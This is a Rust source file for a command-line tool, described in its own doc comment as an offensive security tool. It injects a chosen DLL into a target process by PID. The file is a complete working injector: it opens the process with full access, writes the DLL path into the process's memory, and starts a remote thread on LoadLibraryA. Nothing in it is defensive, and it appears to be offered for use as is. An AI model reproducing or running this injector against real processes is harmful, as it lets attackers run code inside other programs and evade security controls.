use clap::Parser;
use std::path::Path;
use windows::core::PCSTR;
use std::process::{ExitCode};
use windows::Win32::Foundation::{CloseHandle};
use windows::Win32::System::Threading::CreateRemoteThread;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};
use windows::Win32::System::LibraryLoader::{GetProcAddress, GetModuleHandleA};
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};


/// Offensive security tool that allows injecting the given DLL into the given Process ID (PID).
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// The DLL file to be injected.
    #[arg(short, long)]
    name: String,

    /// The PID where the DLL file should be injected.
    #[arg(short, long)]
    pid: u32,
}


fn main() -> ExitCode {
    let args = Args::parse();
    let dll_path_len = args.name.len() + 1;

    if !Path::new(&args.name).is_file() {
        panic!("{} does not exist.", args.name);
    }

    unsafe {
        // Obtain handle for kernel32.dll
        let hmodule = GetModuleHandleA(PCSTR("kernel32.dll\0".as_ptr()))
            .unwrap_or_else(
                |e| panic!("Failed to obtain handle for kernel32.dll due to error: {}", e)
            );

        // Get the address of LoadLibraryA
        let load_library = GetProcAddress(hmodule, PCSTR("LoadLibraryA\0".as_ptr()))
            .expect("Failed to load library LoadLibraryA.");

        // Open the target process with full access
        let process = OpenProcess(
            PROCESS_ALL_ACCESS,
            false,
            args.pid
        ).expect(&format!("Could not open process with ID: {}", args.pid));

        // Allocate memory in the target process for the DLL path, including null terminator
        let paddress = VirtualAllocEx(
            process,
            None,
            dll_path_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if paddress.is_null() {
            let _ = CloseHandle(process);
            panic!("Could not allocate memory for process with ID: {}", args.pid);
        }

        // Write the DLL path to the allocated memory in the target process
        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            process,
            paddress,
            args.name.as_ptr() as *const _,
            dll_path_len,
            Some(&mut bytes_written as *mut usize)
        ).is_err() {
            let _ = CloseHandle(process);
            panic!("Could not write to process with ID: {}", args.pid);
        } else if bytes_written != dll_path_len {
            let _ = CloseHandle(process);
            panic!(
                "Partial write occurred. Expected {} bytes, but wrote {}.",
                dll_path_len,
                bytes_written
            );
        };

        // Create a remote thread in the target process that calls LoadLibraryA
        if CreateRemoteThread(
            process,
            None,
            0,
            Some(std::mem::transmute(load_library)),
            Some(paddress),
            0,
            None,
        ).is_err() {
            panic!("Could not create remote thread.");
        }

        // Clean up by closing the process handle
        let _ = CloseHandle(process);
    }
    ExitCode::SUCCESS
}
